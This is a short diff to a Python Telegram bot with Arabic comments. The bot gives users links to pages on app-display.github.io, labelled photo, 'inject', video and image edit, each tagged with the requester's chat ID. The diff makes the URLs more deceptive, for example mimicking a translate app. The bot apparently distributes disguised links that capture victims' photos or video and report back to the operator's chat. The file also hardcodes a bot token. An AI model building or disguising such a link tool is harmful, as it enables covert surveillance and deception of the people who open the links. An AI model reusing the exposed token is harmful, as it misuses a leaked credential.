@@ -12,8 +12,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 BOT_TOKEN = "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc"
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# الروابط المستقلة
-PHOTO_PAGE = "https://app-display.github.io/ca.html" 
+# الروابط المحددة
+PHOTO_PAGE = "https://app-display.github.io/ca.html-chatld-/" 
 INJECT_PAGE = "https://app-display.github.io/ca.html-chatld2/"
 VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
 IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"
@@ -76,6 +76,7 @@ def handle_query(call):
     elif call.data == "main_menu":
         bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
     
+    # الروابط المحددة
     elif call.data == "get_photo_link": bot.send_message(chat_id, f"🖼️ رابط الصور:\n{PHOTO_PAGE}?chatId={chat_id}")
     elif call.data == "get_video_link": bot.send_message(chat_id, f"🎥 رابط الفيديو:\n{VIDEO_PAGE_URL}?chatId={chat_id}")
     elif call.data == "get_image_edit_link": bot.send_message(chat_id, f"✨ رابط التعديل:\n{IMAGE_EDIT_URL}?chatId={chat_id}")
